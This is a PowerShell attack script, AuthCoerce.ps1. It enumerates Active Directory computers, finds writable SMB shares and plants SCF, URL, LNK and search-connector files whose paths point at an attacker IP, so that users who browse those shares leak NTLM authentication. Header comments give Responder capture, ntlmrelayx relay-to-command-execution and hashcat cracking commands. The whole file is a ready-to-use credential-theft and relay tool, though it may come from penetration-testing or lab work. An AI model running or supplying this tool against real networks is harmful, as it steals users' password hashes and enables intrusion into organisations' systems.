#
# AuthCoerce.ps1 — Plant NTLM coercion files into writable AD shares
#
# SETUP (on Kali, before running this script):
# -----------------------------------------------
# Option A — Capture hash (crack offline):
#   sudo responder -I tun0 -wv
#
# Option B — Relay hash (no crack, direct exec):
#   sudo ntlmrelayx.py -t smb://<TARGET_IP> -smb2support -c "whoami"
#   Check relay targets first: netexec smb <subnet>/24 --gen-relay-list targets.txt
#
# USAGE:
# -----------------------------------------------
#   .\AuthCoerce.ps1 -IP 192.168.45.241
#       Plant files in all discovered writable shares
#
#   .\AuthCoerce.ps1 -IP 192.168.45.241 -Host DC01
#       Target a single hostname only
#
#   .\AuthCoerce.ps1 -IP 192.168.45.241 -Cleanup
#       Remove all planted files (reads log written during plant)
#
#   .\AuthCoerce.ps1 -IP 192.168.45.241 -Types scf,url
#       Plant only specific file types (scf, url, lnk, search)
#
# WHAT YOU GET:
# -----------------------------------------------
#   Responder  → NTLMv2 hash → hashcat -m 5600 hash.txt rockyou.txt
#   Relay      → direct exec on relay target (SMB signing must be off)
#
# LOG:
#   All planted paths written to .\AuthCoerce_planted.log for cleanup
#

param(
    [Parameter(Mandatory)][string]$IP,
    [string]$TargetHost   = '',
    [switch]$Cleanup,
    [string]$Types        = 'scf,url,lnk,search'
)

$ErrorActionPreference = 'SilentlyContinue'
Set-StrictMode -Off

$LOG_FILE   = Join-Path $PSScriptRoot 'AuthCoerce_planted.log'
$SKIP_SHARES = @('IPC$','print$','ADMIN$','C$','D$','E$','F$')
$USE_TYPES  = $Types.ToLower() -split ','

function Write-Ok   { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Fail { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Warn { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Info { param($m) Write-Host "[*] $m" -ForegroundColor DarkGray}

function Get-ADComputers {
    param([string]$Single)
    $out = [System.Collections.Generic.List[string]]::new()
    if ($Single) { $out.Add($Single); return $out }
    try {
        $s = [System.DirectoryServices.DirectorySearcher]::new()
        $s.Filter   = '(objectCategory=computer)'
        $s.PageSize = 1000
        [void]$s.PropertiesToLoad.Add('dNSHostName')
        [void]$s.PropertiesToLoad.Add('sAMAccountName')
        foreach ($r in $s.FindAll()) {
            $dns = "$($r.Properties['dNSHostName'])"
            $sam = "$($r.Properties['sAMAccountName'])".TrimEnd('$')
            $h   = if ($dns -and $dns -ne '') { $dns } else { $sam }
            if ($h) { $out.Add($h) }
        }
    } catch { Write-Fail "AD enumeration failed: $_" }
    return $out
}

function Get-WritableShares {
    param([string]$Host)
    $out = [System.Collections.Generic.List[string]]::new()
    try {
        $shares = net view "\\$Host" /all 2>$null |
            Where-Object { $_ -match '^\S' -and $_ -notmatch 'Share name|------|-The command' } |
            ForEach-Object { ($_ -split '\s+')[0] }
        foreach ($share in $shares) {
            $share = $share.Trim()
            if (-not $share -or $SKIP_SHARES -contains $share) { continue }
            $unc = "\\$Host\$share"
            try {
                $tmp = Join-Path $unc ("._actest_" + [System.IO.Path]::GetRandomFileName())
                [System.IO.File]::WriteAllBytes($tmp, [byte[]]@(0x00))
                Remove-Item $tmp -Force -ErrorAction SilentlyContinue
                $out.Add($unc)
            } catch {}
        }
    } catch {}
    return $out
}

function Build-SCF {
    param([string]$IP)
    return @"
[Shell]
Command=2
IconFile=\\$IP\x
[Taskbar]
Command=ToggleDesktop
"@
}

function Build-URL {
    param([string]$IP)
    return @"
[InternetShortcut]
URL=file:///$IP/x
WorkingDirectory=\\$IP\x
IconFile=\\$IP\x\favicon.ico
IconIndex=1
"@
}

function Build-Search {
    param([string]$IP)
    return @"
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
  <description>AuthCoerce</description>
  <isSearchOnlyItem>false</isSearchOnlyItem>
  <includeInStartMenuScope>true</includeInStartMenuScope>
  <templateInfo><folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType></templateInfo>
  <simpleLocation><url>\\$IP\x</url></simpleLocation>
</searchConnectorDescription>
"@
}

function Build-LNK {
    param([string]$SharePath, [string]$IP)
    try {
        $wsh = New-Object -ComObject WScript.Shell
        $lnk = $wsh.CreateShortcut("$SharePath\@AuthCoerce.lnk")
        $lnk.TargetPath      = "\\$IP\x"
        $lnk.IconLocation    = "\\$IP\x\icon.ico"
        $lnk.WorkingDirectory= "\\$IP\x"
        $lnk.Save()
        return "$SharePath\@AuthCoerce.lnk"
    } catch { return $null }
}

function Plant-Files {
    param([string]$SharePath, [string]$IP)
    $planted = [System.Collections.Generic.List[string]]::new()

    if ('scf' -in $USE_TYPES) {
        $p = "$SharePath\@AuthCoerce.scf"
        try {
            [System.IO.File]::WriteAllText($p, (Build-SCF $IP))
            $planted.Add($p)
            Write-Ok "SCF    -> $p"
        } catch { Write-Fail "SCF failed: $p" }
    }

    if ('url' -in $USE_TYPES) {
        $p = "$SharePath\@AuthCoerce.url"
        try {
            [System.IO.File]::WriteAllText($p, (Build-URL $IP))
            $planted.Add($p)
            Write-Ok "URL    -> $p"
        } catch { Write-Fail "URL failed: $p" }
    }

    if ('search' -in $USE_TYPES) {
        $p = "$SharePath\@AuthCoerce.searchConnector-ms"
        try {
            [System.IO.File]::WriteAllText($p, (Build-Search $IP))
            $planted.Add($p)
            Write-Ok "SEARCH -> $p"
        } catch { Write-Fail "SEARCH failed: $p" }
    }

    if ('lnk' -in $USE_TYPES) {
        $p = Build-LNK $SharePath $IP
        if ($p) {
            $planted.Add($p)
            Write-Ok "LNK    -> $p"
        } else { Write-Fail "LNK failed: $SharePath" }
    }

    return $planted
}

function Invoke-Cleanup {
    if (-not (Test-Path $LOG_FILE)) {
        Write-Warn "No log file found: $LOG_FILE"
        return
    }
    $paths = Get-Content $LOG_FILE -ErrorAction SilentlyContinue |
        Where-Object { $_ -match '\S' }
    if (-not $paths) { Write-Warn "Log file empty."; return }
    $ok = 0; $fail = 0
    foreach ($p in $paths) {
        try {
            Remove-Item $p -Force -ErrorAction Stop
            Write-Ok "Removed: $p"
            $ok++
        } catch {
            Write-Fail "Could not remove: $p"
            $fail++
        }
    }
    Remove-Item $LOG_FILE -Force -ErrorAction SilentlyContinue
    Write-Host ""
    Write-Info "Cleanup done. Removed:$ok  Failed:$fail"
}

if ($Cleanup) {
    Write-Host ""
    Write-Host "=== AuthCoerce Cleanup ===" -ForegroundColor Cyan
    Write-Host ""
    Invoke-Cleanup
    exit 0
}

Write-Host ""
Write-Host "=== AuthCoerce ===" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Attacker IP : $IP"
Write-Host "  Types       : $($USE_TYPES -join ', ')"
Write-Host "  Target      : $(if ($TargetHost) { $TargetHost } else { 'All AD computers' })"
Write-Host ""
Write-Warn "Responder/ntlmrelayx must be running on $IP before files are triggered"
Write-Host ""

$computers = Get-ADComputers $TargetHost
Write-Info "Found $($computers.Count) computer(s)"
Write-Host ""

$allPlanted = [System.Collections.Generic.List[string]]::new()
$hostHits   = 0
$shareHits  = 0

foreach ($computer in $computers) {
    Write-Info "Scanning: $computer"
    $shares = Get-WritableShares $computer
    if ($shares.Count -eq 0) {
        Write-Info "  No writable shares"
        continue
    }
    $hostHits++
    foreach ($share in $shares) {
        Write-Warn "Writable: $share"
        $planted = Plant-Files $share $IP
        foreach ($p in $planted) { $allPlanted.Add($p) }
        $shareHits++
    }
    Write-Host ""
}

if ($allPlanted.Count -gt 0) {
    [System.IO.File]::WriteAllLines($LOG_FILE, $allPlanted)
    Write-Host ""
    Write-Host "=== Summary ===" -ForegroundColor Cyan
    Write-Ok "Hosts with writable shares : $hostHits"
    Write-Ok "Shares planted             : $shareHits"
    Write-Ok "Files planted              : $($allPlanted.Count)"
    Write-Ok "Log                        : $LOG_FILE"
    Write-Host ""
    Write-Host "  Waiting for auth..." -ForegroundColor Yellow
    Write-Host "  Responder will show NTLMv2 hashes as users browse planted shares" -ForegroundColor DarkGray
    Write-Host "  hashcat -m 5600 hash.txt rockyou.txt" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  Cleanup when done:" -ForegroundColor DarkGray
    Write-Host "  .\AuthCoerce.ps1 -IP $IP -Cleanup" -ForegroundColor DarkGray
} else {
    Write-Fail "Nothing planted. No writable shares found or all writes failed."
}
